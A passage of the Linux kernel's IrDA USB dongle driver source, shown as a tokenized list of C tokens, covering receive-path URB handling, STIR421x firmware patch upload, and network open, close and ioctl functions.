"context", ";", "struct", "irda_usb_cb", "*", "self", ";", "struct", "irda_skb_cb", "*", "cb", ";", "struct", "sk_buff", "*", "newskb", ";", "struct", "sk_buff", "*", "dataskb", ";", "struct", "urb", "*", "next_urb", ";", "unsigned", "int", "len", ",", "docopy", ";", "pr_debug", "(", "\"%", "s", "(", "),", "len", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "urb", "-", ">", "actual_length", ")", ";", "/", "*", "Find", "ourselves", "*", "/", "cb", "=", "(", "struct", "irda_skb_cb", "*", ")", "skb", "-", ">", "cb", ";", "IRDA_ASSERT", "(", "cb", "!", "=", "NULL", ",", "return", ";", ");", "self", "=", "(", "struct", "irda_usb_cb", "*", ")", "cb", "-", ">", "context", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ");", "/", "*", "If", "the", "network", "is", "closed", "or", "the", "device", "gone", ",", "stop", "everything", "*", "/", "if", "(", "(!", "self", "-", ">", "netopen", ")", "|", "|", "(", "!", "self", "-", ">", "present", ")", ")", "{", "pr_debug", "(", "\"%", "s", "(", "),", "Network", "is", "gone", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "/", "*", "Don", "'", "t", "re", "-", "submit", "the", "URB", ":", "will", "stall", "the", "Rx", "path", "*", "/", "return", ";", "}", "/", "*", "Check", "the", "status", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "switch", "(", "urb", "-", ">", "status", ")", "{", "case", "-", "EILSEQ", ":", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_crc_errors", "+", "+;", "/", "*", "Also", "precursor", "to", "a", "hot", "-", "unplug", "on", "UHCI", ".", "*", "/", "/", "*", "Fallthrough", ".", "..", "*", "/", "case", "-", "ECONNRESET", ":", "/", "*", "Random", "error", ",", "if", "I", "remember", "correctly", "*", "/", "/", "*", "uhci_cleanup_unlink", "(", ")", "is", "going", "to", "kill", "the", "Rx", "*", "URB", "just", "after", "we", "return", ".", "No", "problem", ",", "at", "this", "*", "point", "the", "URB", "will", "be", "idle", ";", "-)", "-", "Jean", "II", "*", "/", "case", "-", "ESHUTDOWN", ":", "/", "*", "That", "'", "s", "usually", "a", "hot", "-", "unplug", ".", "Submit", "will", "fail", ".", "..", "*", "/", "case", "-", "ETIME", ":", "/", "*", "Usually", "precursor", "to", "a", "hot", "-", "unplug", "on", "OHCI", ".", "*", "/", "default", ":", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_errors", "+", "+;", "pr_debug", "(", "\"%", "s", "(", "),", "RX", "status", "%", "d", ",", "transfer_flags", "0x", "%", "04X", "\\", "n", "\"", ",", "__func__", ",", "urb", "-", ">", "status", ",", "urb", "-", ">", "transfer_flags", ")", ";", "break", ";", "}", "/", "*", "If", "we", "received", "an", "error", ",", "we", "don", "'", "t", "want", "to", "resubmit", "the", "*", "Rx", "URB", "straight", "away", "but", "to", "give", "the", "USB", "layer", "a", "little", "*", "bit", "of", "breathing", "room", ".", "*", "We", "are", "in", "the", "USB", "thread", "context", ",", "therefore", "there", "is", "a", "*", "danger", "of", "recursion", "(", "new", "URB", "we", "submit", "fails", ",", "we", "come", "*", "back", "here", ")", ".", "*", "With", "recent", "USB", "stack", "(", "2", ".", "6", ".", "15", "+", "),", "I", "'", "m", "seeing", "that", "on", "*", "hot", "unplug", "of", "the", "dongle", ".", "..", "*", "Lowest", "effective", "timer", "is", "10ms", ".", "..", "*", "Jean", "II", "*", "/", "self", "-", ">", "rx_defer_timer_urb", "=", "urb", ";", "mod_timer", "(", "&", "self", "-", ">", "rx_defer_timer", ",", "jiffies", "+", "msecs_to_jiffies", "(", "10", ")", ");", "return", ";", "}", "/", "*", "Check", "for", "empty", "frames", "*", "/", "if", "(", "urb", "-", ">", "actual_length", "<", "=", "self", "-", ">", "header_length", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "empty", "frame", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "goto", "done", ";", "}", "/", "*", "*", "Remember", "the", "time", "we", "received", "this", "frame", ",", "so", "we", "can", "*", "reduce", "the", "min", "turn", "time", "a", "bit", "since", "we", "will", "know", "*", "how", "much", "time", "we", "have", "used", "for", "protocol", "processing", "*", "/", "self", "-", ">", "stamp", "=", "ktime_get", "(", ");", "/", "*", "Check", "if", "we", "need", "to", "copy", "the", "data", "to", "a", "new", "skb", "or", "not", ".", "*", "For", "most", "frames", ",", "we", "use", "ZeroCopy", "and", "pass", "the", "already", "*", "allocated", "skb", "up", "the", "stack", ".", "*", "If", "the", "frame", "is", "small", ",", "it", "is", "more", "efficient", "to", "copy", "it", "*", "to", "save", "memory", "(", "copy", "will", "be", "fast", "anyway", "-", "that", "'", "s", "*", "called", "Rx", "-", "copy", "-", "break", ")", ".", "Jean", "II", "*", "/", "docopy", "=", "(", "urb", "-", ">", "actual_length", "<", "IRDA_RX_COPY_THRESHOLD", ")", ";", "/", "*", "Allocate", "a", "new", "skb", "*", "/", "if", "(", "self", "-", ">", "capability", "&", "IUC_STIR421X", ")", "newskb", "=", "dev_alloc_skb", "(", "docopy", "?", "urb", "-", ">", "actual_length", ":", "IRDA_SKB_MAX_MTU", "+", "USB_IRDA_STIR421X_HEADER", ")", ";", "else", "newskb", "=", "dev_alloc_skb", "(", "docopy", "?", "urb", "-", ">", "actual_length", ":", "IRDA_SKB_MAX_MTU", ")", ";", "if", "(", "!", "newskb", ")", "{", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_dropped", "+", "+;", "/", "*", "We", "could", "deliver", "the", "current", "skb", ",", "but", "this", "would", "stall", "*", "the", "Rx", "path", ".", "Better", "drop", "the", "packet", ".", "..", "Jean", "II", "*", "/", "goto", "done", ";", "}", "/", "*", "Make", "sure", "IP", "header", "get", "aligned", "(", "IrDA", "header", "is", "5", "bytes", ")", "*", "/", "/", "*", "But", "IrDA", "-", "USB", "header", "is", "1", "byte", ".", "Jean", "II", "*", "/", "/", "/", "skb_reserve", "(", "newskb", ",", "USB_IRDA_HEADER", "-", "1", ")", ";", "if", "(", "docopy", ")", "{", "/", "*", "Copy", "packet", ",", "so", "we", "can", "recycle", "the", "original", "*", "/", "skb_copy_from_linear_data", "(", "skb", ",", "newskb", "-", ">", "data", ",", "urb", "-", ">", "actual_length", ")", ";", "/", "*", "Deliver", "this", "new", "skb", "*", "/", "dataskb", "=", "newskb", ";", "/", "*", "And", "hook", "the", "old", "skb", "to", "the", "URB", "*", "Note", ":", "we", "don", "'", "t", "need", "to", "\"", "clean", "up", "\"", "the", "old", "skb", ",", "*", "as", "we", "never", "touched", "it", ".", "Jean", "II", "*", "/", "}", "else", "{", "/", "*", "We", "are", "using", "ZeroCopy", ".", "Deliver", "old", "skb", "*", "/", "dataskb", "=", "skb", ";", "/", "*", "And", "hook", "the", "new", "skb", "to", "the", "URB", "*", "/", "skb", "=", "newskb", ";", "}", "/", "*", "Set", "proper", "length", "on", "skb", "&", "remove", "USB", "-", "IrDA", "header", "*", "/", "skb_put", "(", "dataskb", ",", "urb", "-", ">", "actual_length", ")", ";", "skb_pull", "(", "dataskb", ",", "self", "-", ">", "header_length", ")", ";", "/", "*", "Ask", "the", "networking", "layer", "to", "queue", "the", "packet", "for", "the", "IrDA", "stack", "*", "/", "dataskb", "-", ">", "dev", "=", "self", "-", ">", "netdev", ";", "skb_reset_mac_header", "(", "dataskb", ")", ";", "dataskb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "len", "=", "dataskb", "-", ">", "len", ";", "netif_rx", "(", "dataskb", ")", ";", "/", "*", "Keep", "stats", "up", "to", "date", "*", "/", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_bytes", "+", "=", "len", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "done", ":", "/", "*", "Note", ":", "at", "this", "point", ",", "the", "URB", "we", "'", "ve", "just", "received", "(", "urb", ")", "*", "is", "still", "referenced", "by", "the", "USB", "layer", ".", "For", "example", ",", "if", "we", "*", "have", "received", "a", "-", "ECONNRESET", ",", "uhci_cleanup_unlink", "(", ")", "will", "*", "continue", "to", "process", "it", "(", "in", "fact", ",", "cleaning", "it", "up", ")", ".", "*", "If", "we", "were", "to", "submit", "this", "URB", ",", "disaster", "would", "ensue", ".", "*", "Therefore", ",", "we", "submit", "our", "idle", "URB", ",", "and", "put", "this", "URB", "in", "our", "*", "idle", "slot", ".", "..", ".", "*", "Jean", "II", "*", "/", "/", "*", "Note", ":", "with", "this", "scheme", ",", "we", "could", "submit", "the", "idle", "URB", "before", "*", "processing", "the", "Rx", "URB", ".", "I", "don", "'", "t", "think", "it", "would", "buy", "us", "anything", "as", "*", "we", "are", "running", "in", "the", "USB", "thread", "context", ".", "Jean", "II", "*", "/", "next_urb", "=", "self", "-", ">", "idle_rx_urb", ";", "/", "*", "Recycle", "Rx", "URB", ":", "Now", ",", "the", "idle", "URB", "is", "the", "present", "one", "*", "/", "urb", "-", ">", "context", "=", "NULL", ";", "self", "-", ">", "idle_rx_urb", "=", "urb", ";", "/", "*", "Submit", "the", "idle", "URB", "to", "replace", "the", "URB", "we", "'", "ve", "just", "received", ".", "*", "Do", "it", "last", "to", "avoid", "race", "conditions", ".", "..", "Jean", "II", "*", "/", "irda_usb_submit", "(", "self", ",", "skb", ",", "next_urb", ")", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "In", "case", "of", "errors", ",", "we", "want", "the", "USB", "layer", "to", "have", "time", "to", "recover", ".", "*", "Now", ",", "it", "is", "time", "to", "resubmit", "ouur", "Rx", "URB", ".", "..", "*", "/", "static", "void", "irda_usb_rx_defer_expired", "(", "struct", "timer_list", "*", "t", ")", "{", "struct", "irda_usb_cb", "*", "self", "=", "from_timer", "(", "self", ",", "t", ",", "rx_defer_timer", ")", ";", "struct", "urb", "*", "urb", "=", "self", "-", ">", "rx_defer_timer_urb", ";", "struct", "sk_buff", "*", "skb", "=", "(", "struct", "sk_buff", "*", ")", "urb", "-", ">", "context", ";", "struct", "urb", "*", "next_urb", ";", "/", "*", "Same", "stuff", "as", "when", "Rx", "is", "done", ",", "see", "above", ".", "..", "*", "/", "next_urb", "=", "self", "-", ">", "idle_rx_urb", ";", "urb", "-", ">", "context", "=", "NULL", ";", "self", "-", ">", "idle_rx_urb", "=", "urb", ";", "irda_usb_submit", "(", "self", ",", "skb", ",", "next_urb", ")", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Callbak", "from", "IrDA", "layer", ".", "IrDA", "wants", "to", "know", "if", "we", "have", "*", "started", "receiving", "anything", ".", "*", "/", "static", "int", "irda_usb_is_receiving", "(", "struct", "irda_usb_cb", "*", "self", ")", "{", "/", "*", "Note", ":", "because", "of", "the", "way", "UHCI", "works", ",", "it", "'", "s", "almost", "impossible", "*", "to", "get", "this", "info", ".", "The", "Controller", "DMA", "directly", "to", "memory", "and", "*", "signal", "only", "when", "the", "whole", "frame", "is", "finished", ".", "To", "know", "if", "the", "*", "first", "TD", "of", "the", "URB", "has", "been", "filled", "or", "not", "seems", "hard", "work", ".", "..", "*", "*", "The", "other", "solution", "would", "be", "to", "use", "the", "\"", "receiving", "\"", "command", "*", "on", "the", "default", "decriptor", "with", "a", "usb_control_msg", "(", "),", "but", "that", "*", "would", "add", "USB", "traffic", "and", "would", "return", "result", "only", "in", "the", "*", "next", "USB", "frame", "(", "~", "1ms", ")", ".", "*", "*", "I", "'", "ve", "been", "told", "that", "current", "dongles", "send", "status", "info", "on", "their", "*", "interrupt", "endpoint", ",", "and", "that", "'", "s", "what", "the", "Windows", "driver", "uses", "*", "to", "know", "this", "info", ".", "Unfortunately", ",", "this", "is", "not", "yet", "in", "the", "spec", ".", "..", "*", "*", "Jean", "II", "*", "/", "return", "0", ";", "/", "*", "For", "now", "*", "/", "}", "#", "define", "STIR421X_PATCH_PRODUCT_VER", "\"", "Product", "Version", ":", "\"", "#", "define", "STIR421X_PATCH_STMP_TAG", "\"", "STMP", "\"", "#", "define", "STIR421X_PATCH_CODE_OFFSET", "512", "/", "*", "patch", "image", "starts", "before", "here", "*", "/", "/", "*", "marks", "end", "of", "patch", "file", "header", "(", "PC", "DOS", "text", "file", "EOF", "character", ")", "*", "/", "#", "define", "STIR421X_PATCH_END_OF_HDR_TAG", "0x1A", "#", "define", "STIR421X_PATCH_BLOCK_SIZE", "1023", "/", "*", "*", "Function", "stir421x_fwupload", "(", "struct", "irda_usb_cb", "*", "self", ",", "*", "unsigned", "char", "*", "patch", ",", "*", "const", "unsigned", "int", "patch_len", ")", "*", "*", "Upload", "firmware", "code", "to", "SigmaTel", "421X", "IRDA", "-", "USB", "dongle", "*", "/", "static", "int", "stir421x_fw_upload", "(", "struct", "irda_usb_cb", "*", "self", ",", "const", "unsigned", "char", "*", "patch", ",", "const", "unsigned", "int", "patch_len", ")", "{", "int", "ret", "=", "-", "ENOMEM", ";", "int", "actual_len", "=", "0", ";", "unsigned", "int", "i", ";", "unsigned", "int", "block_size", "=", "0", ";", "unsigned", "char", "*", "patch_block", ";", "patch_block", "=", "kzalloc", "(", "STIR421X_PATCH_BLOCK_SIZE", ",", "GFP_KERNEL", ")", ";", "if", "(", "patch_block", "=", "=", "NULL", ")", "return", "-", "ENOMEM", ";", "/", "*", "break", "up", "patch", "into", "1023", "-", "byte", "sections", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "patch_len", ";", "i", "+", "=", "block_size", ")", "{", "block_size", "=", "patch_len", "-", "i", ";", "if", "(", "block_size", ">", "STIR421X_PATCH_BLOCK_SIZE", ")", "block_size", "=", "STIR421X_PATCH_BLOCK_SIZE", ";", "/", "*", "upload", "the", "patch", "section", "*", "/", "memcpy", "(", "patch_block", ",", "patch", "+", "i", ",", "block_size", ")", ";", "ret", "=", "usb_bulk_msg", "(", "self", "-", ">", "usbdev", ",", "usb_sndbulkpipe", "(", "self", "-", ">", "usbdev", ",", "self", "-", ">", "bulk_out_ep", ")", ",", "patch_block", ",", "block_size", ",", "&", "actual_len", ",", "msecs_to_jiffies", "(", "500", ")", ");", "pr_debug", "(", "\"%", "s", "(", "):", "Bulk", "send", "%", "u", "bytes", ",", "ret", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "actual_len", ",", "ret", ")", ";", "if", "(", "ret", "<", "0", ")", "break", ";", "mdelay", "(", "10", ")", ";", "}", "kfree", "(", "patch_block", ")", ";", "return", "ret", ";", "}", "/", "*", "*", "Function", "stir421x_patch_device", "(", "struct", "irda_usb_cb", "*", "self", ")", "*", "*", "Get", "a", "firmware", "code", "from", "userspase", "using", "hotplug", "request_firmware", "(", ")", "call", "*", "/", "static", "int", "stir421x_patch_device", "(", "struct", "irda_usb_cb", "*", "self", ")", "{", "unsigned", "int", "i", ";", "int", "ret", ";", "char", "stir421x_fw_name", "[", "12", "]", ";", "const", "struct", "firmware", "*", "fw", ";", "const", "unsigned", "char", "*", "fw_version_ptr", ";", "/", "*", "pointer", "to", "version", "string", "*", "/", "unsigned", "long", "fw_version", "=", "0", ";", "/", "*", "*", "Known", "firmware", "patch", "file", "names", "for", "STIR421x", "dongles", "*", "are", "\"", "42101001", ".", "sb", "\"", "or", "\"", "42101002", ".", "sb", "\"", "*", "/", "sprintf", "(", "stir421x_fw_name", ",", "\"", "4210", "%", "4X", ".", "sb", "\"", ",", "le16_to_cpu", "(", "self", "-", ">", "usbdev", "-", ">", "descriptor", ".", "bcdDevice", ")", ");", "ret", "=", "request_firmware", "(", "&", "fw", ",", "stir421x_fw_name", ",", "&", "self", "-", ">", "usbdev", "-", ">", "dev", ")", ";", "if", "(", "ret", "<", "0", ")", "return", "ret", ";", "/", "*", "We", "get", "a", "patch", "from", "userspace", "*", "/", "net_info_ratelimited", "(", "\"%", "s", "(", "):", "Received", "firmware", "%", "s", "(", "%", "zu", "bytes", ")", "\\", "n", "\"", ",", "__func__", ",", "stir421x_fw_name", ",", "fw", "-", ">", "size", ")", ";", "ret", "=", "-", "EINVAL", ";", "/", "*", "Get", "the", "bcd", "product", "version", "*", "/", "if", "(", "!", "memcmp", "(", "fw", "-", ">", "data", ",", "STIR421X_PATCH_PRODUCT_VER", ",", "sizeof", "(", "STIR421X_PATCH_PRODUCT_VER", ")", "-", "1", ")", ")", "{", "fw_version_ptr", "=", "fw", "-", ">", "data", "+", "sizeof", "(", "STIR421X_PATCH_PRODUCT_VER", ")", "-", "1", ";", "/", "*", "Let", "'", "s", "check", "if", "the", "product", "version", "is", "dotted", "*", "/", "if", "(", "fw_version_ptr", "[", "3", "]", "=", "=", "'", ".'", "&", "&", "fw_version_ptr", "[", "7", "]", "=", "=", "'", ".'", ")", "{", "unsigned", "long", "major", ",", "minor", ",", "build", ";", "major", "=", "simple_strtoul", "(", "fw_version_ptr", ",", "NULL", ",", "10", ")", ";", "minor", "=", "simple_strtoul", "(", "fw_version_ptr", "+", "4", ",", "NULL", ",", "10", ")", ";", "build", "=", "simple_strtoul", "(", "fw_version_ptr", "+", "8", ",", "NULL", ",", "10", ")", ";", "fw_version", "=", "(", "major", "<", "<", "12", ")", "+", "(", "minor", "<", "<", "8", ")", "+", "(", "(", "build", "/", "10", ")", "<", "<", "4", ")", "+", "(", "build", "%", "10", ")", ";", "pr_debug", "(", "\"%", "s", "(", "):", "Firmware", "Product", "version", "%", "ld", "\\", "n", "\"", ",", "__func__", ",", "fw_version", ")", ";", "}", "}", "if", "(", "self", "-", ">", "usbdev", "-", ">", "descriptor", ".", "bcdDevice", "=", "=", "cpu_to_le16", "(", "fw_version", ")", ")", "{", "/", "*", "*", "If", "we", "'", "re", "here", ",", "we", "'", "ve", "found", "a", "correct", "patch", "*", "The", "actual", "image", "starts", "after", "the", "\"", "STMP", "\"", "keyword", "*", "so", "forward", "to", "the", "firmware", "header", "tag", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "fw", "-", ">", "size", "&", "&", "fw", "-", ">", "data", "[", "i", "]", "!", "=", "STIR421X_PATCH_END_OF_HDR_TAG", ";", "i", "+", "+)", ";", "/", "*", "here", "we", "check", "for", "the", "out", "of", "buffer", "case", "*", "/", "if", "(", "i", "<", "STIR421X_PATCH_CODE_OFFSET", "&", "&", "i", "<", "fw", "-", ">", "size", "&", "&", "STIR421X_PATCH_END_OF_HDR_TAG", "=", "=", "fw", "-", ">", "data", "[", "i", "]", ")", "{", "if", "(", "!", "memcmp", "(", "fw", "-", ">", "data", "+", "i", "+", "1", ",", "STIR421X_PATCH_STMP_TAG", ",", "sizeof", "(", "STIR421X_PATCH_STMP_TAG", ")", "-", "1", ")", ")", "{", "/", "*", "We", "can", "upload", "the", "patch", "to", "the", "target", "*", "/", "i", "+", "=", "sizeof", "(", "STIR421X_PATCH_STMP_TAG", ")", ";", "ret", "=", "stir421x_fw_upload", "(", "self", ",", "&", "fw", "-", ">", "data", "[", "i", "]", ",", "fw", "-", ">", "size", "-", "i", ")", ";", "}", "}", "}", "release_firmware", "(", "fw", ")", ";", "return", "ret", ";", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "IRDA", "DEVICE", "CALLBACKS", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "*", "Main", "calls", "from", "the", "IrDA", "/", "Network", "subsystem", ".", "*", "Mostly", "registering", "a", "new", "irda", "-", "usb", "device", "and", "removing", "it", ".", "..", ".", "*", "We", "only", "deal", "with", "the", "IrDA", "side", "of", "the", "business", ",", "the", "USB", "side", "will", "*", "be", "dealt", "with", "below", ".", "..", "*", "/", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Function", "irda_usb_net_open", "(", "dev", ")", "*", "*", "Network", "device", "is", "taken", "up", ".", "Usually", "this", "is", "done", "by", "\"", "ifconfig", "irda0", "up", "\"", "*", "*", "Note", ":", "don", "'", "t", "mess", "with", "self", "-", ">", "netopen", "-", "Jean", "II", "*", "/", "static", "int", "irda_usb_net_open", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "irda_usb_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "char", "hwname", "[", "16", "]", ";", "int", "i", ";", "IRDA_ASSERT", "(", "netdev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "netdev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Can", "only", "open", "the", "device", "if", "it", "'", "s", "there", "*", "/", "if", "(", "!", "self", "-", ">", "present", ")", "{", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "device", "not", "present", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", "-", "1", ";", "}", "if", "(", "self", "-", ">", "needspatch", ")", "{", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "device", "needs", "patch", "\\", "n", "\"", ",", "__func__", ")", ";", "return", "-", "EIO", ";", "}", "/", "*", "Initialise", "default", "speed", "and", "xbofs", "value", "*", "(", "IrLAP", "will", "change", "that", "soon", ")", "*", "/", "self", "-", ">", "speed", "=", "-", "1", ";", "self", "-", ">", "xbofs", "=", "-", "1", ";", "self", "-", ">", "new_speed", "=", "-", "1", ";", "self", "-", ">", "new_xbofs", "=", "-", "1", ";", "/", "*", "To", "do", "*", "before", "*", "submitting", "Rx", "urbs", "and", "starting", "net", "Tx", "queue", "*", "Jean", "II", "*", "/", "self", "-", ">", "netopen", "=", "1", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "*", "Now", "that", "everything", "should", "be", "initialized", "properly", ",", "*", "Open", "new", "IrLAP", "layer", "instance", "to", "take", "care", "of", "us", ".", "..", "*", "Note", ":", "will", "send", "immediately", "a", "speed", "change", ".", "..", "*", "/", "sprintf", "(", "hwname", ",", "\"", "usb", "#", "%", "d", "\"", ",", "self", "-", ">", "usbdev", "-", ">", "devnum", ")", ";", "self", "-", ">", "irlap", "=", "irlap_open", "(", "netdev", ",", "&", "self", "-", ">", "qos", ",", "hwname", ")", ";", "IRDA_ASSERT", "(", "self", "-", ">", "irlap", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "/", "*", "Allow", "IrLAP", "to", "send", "data", "to", "us", "*", "/", "netif_start_queue", "(", "netdev", ")", ";", "/", "*", "We", "submit", "all", "the", "Rx", "URB", "except", "for", "one", "that", "we", "keep", "idle", ".", "*", "Need", "to", "be", "initialised", "before", "submitting", "other", "USBs", ",", "because", "*", "in", "some", "cases", "as", "soon", "as", "we", "submit", "the", "URBs", "the", "USB", "layer", "*", "will", "trigger", "a", "dummy", "receive", "-", "Jean", "II", "*", "/", "self", "-", ">", "idle_rx_urb", "=", "self", "-", ">", "rx_urb", "[", "IU_MAX_ACTIVE_RX_URBS", "]", ";", "self", "-", ">", "idle_rx_urb", "-", ">", "context", "=", "NULL", ";", "/", "*", "Now", "that", "we", "can", "pass", "data", "to", "IrLAP", ",", "allow", "the", "USB", "layer", "*", "to", "send", "us", "some", "data", ".", "..", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "IU_MAX_ACTIVE_RX_URBS", ";", "i", "+", "+)", "{", "struct", "sk_buff", "*", "skb", "=", "dev_alloc_skb", "(", "IRDA_SKB_MAX_MTU", ")", ";", "if", "(", "!", "skb", ")", "{", "/", "*", "If", "this", "ever", "happen", ",", "we", "are", "in", "deep", "s", "*", "**", ".", "*", "Basically", ",", "we", "can", "'", "t", "start", "the", "Rx", "path", ".", "..", "*", "/", "return", "-", "1", ";", "}", "/", "/", "skb_reserve", "(", "newskb", ",", "USB_IRDA_HEADER", "-", "1", ")", ";", "irda_usb_submit", "(", "self", ",", "skb", ",", "self", "-", ">", "rx_urb", "[", "i", "]", ");", "}", "/", "*", "Ready", "to", "play", "!", "!!", "*", "/", "return", "0", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "Function", "irda_usb_net_close", "(", "self", ")", "*", "*", "Network", "device", "is", "taken", "down", ".", "Usually", "this", "is", "done", "by", "*", "\"", "ifconfig", "irda0", "down", "\"", "*", "/", "static", "int", "irda_usb_net_close", "(", "struct", "net_device", "*", "netdev", ")", "{", "struct", "irda_usb_cb", "*", "self", ";", "int", "i", ";", "IRDA_ASSERT", "(", "netdev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "netdev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "/", "*", "Clear", "this", "flag", "*", "before", "*", "unlinking", "the", "urbs", "and", "*", "before", "*", "*", "stopping", "the", "network", "Tx", "queue", "-", "Jean", "II", "*", "/", "self", "-", ">", "netopen", "=", "0", ";", "/", "*", "Stop", "network", "Tx", "queue", "*", "/", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "Kill", "defered", "Rx", "URB", "*", "/", "del_timer", "(", "&", "self", "-", ">", "rx_defer_timer", ")", ";", "/", "*", "Deallocate", "all", "the", "Rx", "path", "buffers", "(", "URBs", "and", "skb", ")", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "self", "-", ">", "max_rx_urb", ";", "i", "+", "+)", "{", "struct", "urb", "*", "urb", "=", "self", "-", ">", "rx_urb", "[", "i", "]", ";", "struct", "sk_buff", "*", "skb", "=", "(", "struct", "sk_buff", "*", ")", "urb", "-", ">", "context", ";", "/", "*", "Cancel", "the", "receive", "command", "*", "/", "usb_kill_urb", "(", "urb", ")", ";", "/", "*", "The", "skb", "is", "ours", ",", "free", "it", "*", "/", "if", "(", "skb", ")", "{", "dev_kfree_skb", "(", "skb", ")", ";", "urb", "-", ">", "context", "=", "NULL", ";", "}", "}", "/", "*", "Cancel", "Tx", "and", "speed", "URB", "-", "need", "to", "be", "synchronous", "to", "avoid", "races", "*", "/", "usb_kill_urb", "(", "self", "-", ">", "tx_urb", ")", ";", "usb_kill_urb", "(", "self", "-", ">", "speed_urb", ")", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "if", "(", "self", "-", ">", "irlap", ")", "irlap_close", "(", "self", "-", ">", "irlap", ")", ";", "self", "-", ">", "irlap", "=", "NULL", ";", "return", "0", ";", "}", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "IOCTLs", ":", "Extra", "out", "-", "of", "-", "band", "network", "commands", ".", "..", "*", "/", "static", "int", "irda_usb_net_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "unsigned", "long", "flags", ";", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "struct", "irda_usb_cb", "*", "self", ";", "int", "ret", "=", "0", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", ",", "(", "cmd", "=", "0x", "%", "X", ")", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "cmd", ")", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "/", "*", "Set", "bandwidth", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Protect", "us", "from", "USB", "callbacks", ",", "net", "watchdog", "and", "else", ".", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Check", "if", "the", "device", "is", "still", "there", "*", "/", "if", "(", "self", "-", ">", "present", ")", "{", "/", "*", "Set", "the", "desired", "speed", "*", "/", "self", "-", ">", "new_speed", "=", "irq", "-", ">", "ifr_baudrate", ";", "irda_usb_change_speed_xbofs", "(", "self", ")", ";", "}", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "lock", ",", "flags", ")", ";", "break", ";", "case", "SIOCSMEDIABUSY", ":", "/", "*", "Set", "media", "busy", "*", "/", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "return", "-", "EPERM", ";", "/", "*", "Check", "if", "the", "IrDA", "stack", "is", "still", "there", "*", "/", "if", "(", "self", "-", ">", "netopen", ")", "irda_device_set_media_busy", "(", "self", "-", ">", "netdev", ",", "TRUE", ")", ";", "break", ";", "case", "SIOCGRECEIVING", ":", "/", "*", "Check", "if", "we", "are", "receiving", "right", "now", "*", "/", "irq", "-", ">", "ifr_receiving", "=", 